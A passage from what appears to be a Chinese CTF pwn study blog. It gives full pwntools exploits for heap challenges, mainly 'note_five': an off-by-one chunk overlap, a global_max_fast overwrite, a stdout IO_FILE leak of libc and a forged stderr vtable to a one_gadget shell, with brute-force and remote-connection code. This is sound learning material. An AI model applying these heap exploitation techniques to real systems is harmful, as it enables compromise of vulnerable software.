punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h2><p>考察点：IO_FILE利用<br>这道题我是拿大师傅的exp一步步调试的，算是弄明白了在没有show函数的情况下如何泄露出libc地址<br><a href="https://xz.aliyun.com/t/6468" target="_blank" rel="noopener">这位大师傅</a><br>我对原exp做了点改动，符合个人习惯一点，exp如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># coding=utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">1</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bk</span><span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">"b *"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>mallocr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sl</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rc</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ru</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ti</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    ru<span class="token punctuation">(</span><span class="token string">"choice>> "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"idx: "</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>    stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">''</span>    py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>    onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span>    <span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>    fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span>    binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>    py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span> <span class="token operator">+</span> \        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>    edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> py<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># trigger abort-->flush</span>    malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> i    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        local <span class="token operator">=</span> <span class="token number">1</span>        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> local<span class="token punctuation">:</span>            p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note_five'</span><span class="token punctuation">)</span>            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.246.48'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        sl<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>程序保护全开，菜单题，拖进IDA分析一下<br>main函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/10.jpg" alt=""><br>add函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/11.jpg" alt=""><br>允许分配的chunk大于fastbin<br>edit函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/13.jpg" alt=""><br>其中的sub_A70的函数存在off-by-one漏洞<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/12.jpg" alt=""><br>最后是delete函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/14.jpg" alt=""><br>free并且清零，无漏洞<br>我们的攻击思路如下</p><blockquote><p>1.利用offbyone实现overlap<br>2.利用overlap实现改BK指针，攻击global_max_fast<br>3.改FD指针为stdout-0x51，成功实现劫持<br>4.改结构体从而泄露真实地址<br>5.然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget<br>6.malloc很大的块，最后触发IO_file_overflow中的_IO_flush_all_lockp，从而getshell</p></blockquote><p>首先通过off-by-one触发后向合并</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xf8</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0xe0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x2f0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p>初始状态<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/15.jpg" alt=""><br>free(0)之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/16.jpg" alt=""><br>off-by-one之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/17.jpg" alt=""><br>free(3)之后，导致后向合并<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/18.jpg" alt=""><br>接下来将堆块构造成初始状态</p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x2f0</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/19.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/20.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/21.jpg" alt=""><br>然后free掉chunk1，使main_arena放到chunk1的fd和bk指针上，这样我们就可以通过edit0来修改globa_max_fast了</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x77f8</span>stdout <span class="token operator">=</span> <span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x1229</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token number">0x77f8</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>这里面的<code>0x77f8</code>是global_max_fast地址的最后四位，虽然开启了PIE，但地址的最后三位是不变的，我们只需要爆破倒数第四位即可，也就是十六分之一的几率，我们可以在gdb中看看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/22.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/23.jpg" alt=""><br>global_max_fast与main_arena的地址相比确实只有最后四位不一样，并且最后三位固定为<code>7f8</code><br>而<code>0x1229</code>则是global_max_fast的地址与stdout上可以构造fakechunk的地址的相对便宜<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/24.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>两次malloc之后，global_max_fast的值变成了main_arena+88的地址(十六分之一的几率)<br>接着再将堆块恢复</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>然后开始准备修改IO_FILE，泄露libc地址</p><pre class=" language-python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x22'</span> <span class="token operator">*</span> <span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span></code></pre><p>此时的堆结构如下<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/25.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/26.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/27.jpg" alt=""></p><pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">''</span>py <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x41</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span></code></pre><p>第一次malloc之后<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/28.jpg" alt=""><br>接下来再malloc一次就能将chunk分配到stdout-0x51处<br>然后修改IO_FILE的值，就能泄露出libc地址了<br>剩下的也就比较容易了，再次修改IO_FILE</p><blockquote><p>然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget</p></blockquote><p>附上vtable存储的函数跳转指针</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// "extra word"</span>   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// DUMMY</span>   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// finish</span>   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// overflow</span>   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// underflow</span>   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// uflow</span>   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// pbackfail</span>   <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsputn  #printf</span>   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// xsgetn</span>   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekoff</span>   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seekpos</span>   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// setbuf</span>   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// sync</span>   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// doallocate</span>   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// read</span>   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> 